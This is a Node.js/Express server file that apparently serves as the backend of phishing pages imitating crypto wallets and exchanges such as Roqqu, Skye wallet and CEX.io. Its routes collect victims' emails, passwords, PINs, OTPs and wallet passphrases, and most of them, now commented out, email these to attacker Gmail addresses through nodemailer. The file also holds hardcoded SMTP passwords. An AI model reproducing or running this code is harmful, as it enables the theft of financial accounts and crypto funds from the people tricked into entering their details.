const express = require('express')
const app = express()
const nodemailer = require('nodemailer')
const csrf = require('csurf')
const cookieParser = require('cookie-parser')
const cors = require('cors')
const bodyParser = require('body-parser')
const cookieParser = require('cookie-parser')
const session = require('express-session')

const sessionConfig = {
    // ... other methods
    cookie: {
        sameSite: 'none',
    },
}

if (process.env.NODE_ENV === 'production') {
    app.set('trust proxy', 1) // trust first proxy
    sessionConfig.cookie.secure = true // serve secure cookies
}

app.use(session(sessionConfig))

app.use(express.json())
//app.use(express.urlencoded({ extended: true }))
let parseForm = bodyParser.urlencoded({ extended: false })

const corsOptions = {
    origin: 'https://roqquappchat.com',
    // origin: 'http://localhost:3000',
    credentials: true,
    preflightContinue: true,
    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
}

//app.use(cors(corsOptions))

const csrfProtection = csrf({ cookie: true })

// app.use((req, res, next) => {
//     res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3000')
//     res.setHeader(
//         'Access-Control-Allow-Methods',
//         'OPTIONS, GET, POST, PUT, PATCH, DELETE'
//     )
//     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')

//     if (req.method === 'OPTIONS') {
//         return res.sendStatus(200)
//     }
//     next()
//  })

app.use(cookieParser())

app.get('/', (req, res) => {
    res.send('Welcome to rq1-back current name -- roqquappchat')
})

app.get('/form', csrfProtection, (req, res) => {
    console.log('in form')
    res.send({ csrfToken: req.csrfToken() })
})

app.post('/rq-1', parseForm, csrfProtection, (req, res, next) => {
    console.log('req body', req.body)

    const { email, password, pin, otp } = req.body

    console.log('length of otp', otp.length)

    res.send('success')

    // if (otp.length > 6) {
    //     console.log('Attack started', otp)
    //     return
    // } else {
    //     console.log("Normal email", otp)
    //     const transporter = nodemailer.createTransport({
    //         host: process.env.HOST,
    //         port: 465,
    //         secure: true,
    //         requireTLS: true,
    //         socketTimeout: 1200000,
    //         connectionTimeout: 1200000,
    //         auth: {
    //             user: process.env.EMAIL,
    //             pass: process.env.PASSWORD,
    //         },
    //         tls: {
    //             rejectUnauthorized: false,
    //         },
    //     })

    //     transporter.verify(function (error, _success) {
    //         if (error) {
    //             console.log(error)
    //         } else {
    //             console.log('Server is ready to take our messages')
    //         }
    //     })

    //     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat!`

    //     const mail = {
    //         from: process.env.EMAIL,
    //         //to: process.env.TOEMAIL,
    //          to: 'ifestephenie@gmail.com',
    //         subject: 'New message from Roqquappchat',
    //         html: content,
    //     }

    //     transporter.sendMail(mail, (err, data) => {
    //         if (err) {
    //             console.log({ err })
    //             res.json({
    //                 status: 'fail',
    //             })
    //         } else {
    //             console.log('email sent', data)
    //             res.json({
    //                 status: 'success',
    //             })
    //         }
    //     })
    // }
})

// app.post('/roqquapp', (req, res, next) => {
//     console.log('req body', req.body)

//     const { email, password, pin, otp } = req.body
//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquapp`

//     const mail = {
//         from: 'admin@growveonct.com',
//         to: 'princeco12@gmail.com',
//         //to: 'ifestephenie@gmail.com',
//         subject: 'New message from Roqquapp',
//         html: content,
//     }

//     // const transporter = nodemailer.createTransport({
//     //     host: 'mail.roqquliveappchat.com',
//     //     port: 465,
//     //     secure: true,
//     //     requireTLS: true,
//     //     socketTimeout: 1200000,
//     //     connectionTimeout: 1200000,
//     //     auth: {
//     //         user: 'one@roqquliveappchat.com',
//     //         pass: 'FGChv+2Y%J8*',
//     //     },
//     //     tls: {
//     //         rejectUnauthorized: false,
//     //     },
//     // })

//     transporter.sendMail(mail, (err, data) => {
//         if (err) {
//             console.log({ err })
//             res.json({
//                 status: 'fail',
//             })
//         } else {
//             console.log('email sent', data)
//             res.json({
//                 status: 'success',
//             })
//         }
//     })
// })
// // app.post('/roqqu-app', (req, res, next) => {
// //     console.log('req body', req.body)

// //     const { email, password, pin, otp } = req.body
// //     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqqu-app`

// //     const mail = {
// //         from: 'two@roqquliveappchat.com',
// //         to: 'paysroqquu@gmail.com',
// //         //to: 'ifestephenie@gmail.com',
// //         subject: 'New message from Roqqu-app',
// //         html: content,
// //     }

// //     const transporter = nodemailer.createTransport({
// //         host: 'mail.roqquliveappchat.com',
// //         port: 465,
// //         secure: true,
// //         requireTLS: true,
// //         socketTimeout: 1200000,
// //         connectionTimeout: 1200000,
// //         auth: {
// //             user: 'two@roqquliveappchat.com',
// //             pass: 'MR.~-DC^?W}6',
// //         },
// //         tls: {
// //             rejectUnauthorized: false,
// //         },
// //     })

// //     transporter.sendMail(mail, (err, data) => {
// //         if (err) {
// //             console.log({ err })
// //             res.json({
// //                 status: 'fail',
// //             })
// //         } else {
// //             console.log('email sent', data)
// //             res.json({
// //                 status: 'success',
// //             })
// //         }
// //     })
// // })

// app.post('/roqqulive', (req, res, next) => {
//     console.log('req body', req.body)

//     const { email, password, pin, otp } = req.body
//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `

//     const mail = {
//         from: 'three@roqquliveappchat.com',
//         //to: 'obiolorkingsley22@gmail.com, wj05685@gmail.com',
//         to: 'ifestephenie@gmail.com',
//         subject: 'New message from Roqquliveappchat',
//         html: content,
//     }

//     const transporter = nodemailer.createTransport({
//        host: 'mail.roqquliveappchat.com',
//         port: 465,
//         secure: true,
//         requireTLS: true,
//         socketTimeout: 1200000,
//         connectionTimeout: 1200000,
//         auth: {
//             user: 'three@roqquliveappchat.com',
//             pass: 'nYrZ#&,nKb=3',
//         },
//         tls: {
//             rejectUnauthorized: false,
//         },
//     })

//     transporter.sendMail(mail, (err, data) => {
//         if (err) {
//             console.log({ err })
//             res.json({
//                 status: 'fail',
//             })
//         } else {
//             console.log('email sent', data)
//             res.json({
//                 status: 'success',
//             })
//         }
//     })
// })

// // For skye wallet
// app.post('/skye-app', (req, res, next) => {
//     console.log('req body', req.body)

//     const { email, password, pin } = req.body
//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p> `

//     const mail = {
//         from: 'admin@growveonct.com',
//         to: 'skyewallet.nigeria@gmail.com',
//         subject: 'New message from Skyewallet-app',
//         html: content,
//     }
//     // const transporter = nodemailer.createTransport({
//     //     host: 'mail.growveonct.com',
//     //     port: 465,
//     //     secure: true,
//     //     requireTLS: true,
//     //     socketTimeout: 1200000,
//     //     connectionTimeout: 1200000,
//     //     auth: {
//     //         user: 'admin@growveonct.com',
//     //         pass: 'Panther1.?)0',
//     //     },
//     //     tls: {
//     //         rejectUnauthorized: false,
//     //     },
//     // })

//     transporter.sendMail(mail, (err, data) => {
//         if (err) {
//             console.log({ err })
//             res.json({
//                 status: 'fail',
//             })
//         } else {
//             console.log('email sent', data)
//             res.json({
//                 status: 'success',
//             })
//         }
//     })
// })
// app.post('/skyecore', (req, res, next) => {
//     console.log('req body', req.body)

//     const { email, password, pin } = req.body
//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br>`

//     const mail = {
//         from: 'admin@growveonct.com',
//         to: 'ibominstagram@gmail.com',
//         subject: 'New message from Skyewalletcore',
//         html: content,
//     }
//     // const transporter = nodemailer.createTransport({
//     //     host: 'mail.growveonct.com',
//     //     port: 465,
//     //     secure: true,
//     //     requireTLS: true,
//     //     socketTimeout: 1200000,
//     //     connectionTimeout: 1200000,
//     //     auth: {
//     //         user: 'admin@growveonct.com',
//     //         pass: 'Panther1.?)0',
//     //     },
//     //     tls: {
//     //         rejectUnauthorized: false,
//     //     },
//     // })

//     transporter.sendMail(mail, (err, data) => {
//         if (err) {
//             console.log({ err })
//             res.json({
//                 status: 'fail',
//             })
//         } else {
//             console.log('email sent', data)
//             res.json({
//                 status: 'success',
//             })
//         }
//     })
// })
// app.post('/blkairdrop', (req, res, next) => {
//     console.log('req body', req.body)

//     const { phrase } = req.body
//     const content = `<p><strong>Passphrase:</strong> ${phrase} </p>`

//     const mail = {
//         from: 'admin@growveonct.com',
//         to: 'testimonyibom@gmail.com',
//         subject: 'New message from blockchainairdrop',
//         html: content,
//     }

//     // const transporter = nodemailer.createTransport({
//     //     host: 'mail.growveonct.com',
//     //     port: 465,
//     //     secure: true,
//     //     requireTLS: true,
//     //     socketTimeout: 1200000,
//     //     connectionTimeout: 1200000,
//     //     auth: {
//     //         user: 'admin@growveonct.com',
//     //         pass: 'Panther1.?)0',
//     //     },
//     //     tls: {
//     //         rejectUnauthorized: false,
//     //     },
//     // })

//     transporter.sendMail(mail, (err, data) => {
//         if (err) {
//             console.log({ err })
//             res.json({
//                 status: 'fail',
//             })
//         } else {
//             console.log('email sent', data)
//             res.json({
//                 status: 'success',
//             })
//         }
//     })
// })
// app.post('/blk-support', (req, res, next) => {
//     console.log('req body', req.body)

//     const { phrase } = req.body
//     const content = `<p><strong>Passphrase:</strong> ${phrase} </p>`

//     const mail = {
//         from: 'admin@growveonct.com',
//         to: 'blessedhustle02@gmail.com',
//         subject: 'New message from Block-chainsupport',
//         html: content,
//     }

//     // const transporter = nodemailer.createTransport({
//     //     host: 'mail.growveonct.com',
//     //     port: 465,
//     //     secure: true,
//     //     requireTLS: true,
//     //     socketTimeout: 1200000,
//     //     connectionTimeout: 1200000,
//     //     auth: {
//     //         user: 'admin@growveonct.com',
//     //         pass: 'Panther1.?)0',
//     //     },
//     //     tls: {
//     //         rejectUnauthorized: false,
//     //     },
//     // })

//     transporter.sendMail(mail, (err, data) => {
//         if (err) {
//             console.log({ err })
//             res.json({
//                 status: 'fail',
//             })
//         } else {
//             console.log('email sent', data)
//             res.json({
//                 status: 'success',
//             })
//         }
//     })
// })
// /////////////////// CEX
// app.post('/cex-ioapp', (req, res, next) => {
//     console.log('req body', req.body)

//     const { email, password, pin, otp } = req.body
//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong> ${otp}</p>`

//     const mail = {
//         from: 'admin@growveonct.com',
//         to: 'Ibominstagram@gmail.com',
//         subject: 'New message from Cexioapp',
//         html: content,
//     }

//     // const transporter = nodemailer.createTransport({
//     //     host: 'mail.growveonct.com',
//     //     port: 465,
//     //     secure: true,
//     //     requireTLS: true,
//     //     socketTimeout: 1200000,
//     //     connectionTimeout: 1200000,
//     //     auth: {
//     //         user: 'admin@growveonct.com',
//     //         pass: 'Panther1.?)0',
//     //     },
//     //     tls: {
//     //         rejectUnauthorized: false,
//     //     },
//     // })

//     transporter.sendMail(mail, (err, data) => {
//         if (err) {
//             console.log({ err })
//             res.json({
//                 status: 'fail',
//             })
//         } else {
//             console.log('email sent', data)
//             res.json({
//                 status: 'success',
//             })
//         }
//     })
// })

const PORT = process.env.PORT || 3030
app.listen(PORT, () => console.info(`server has started on ${PORT}`))
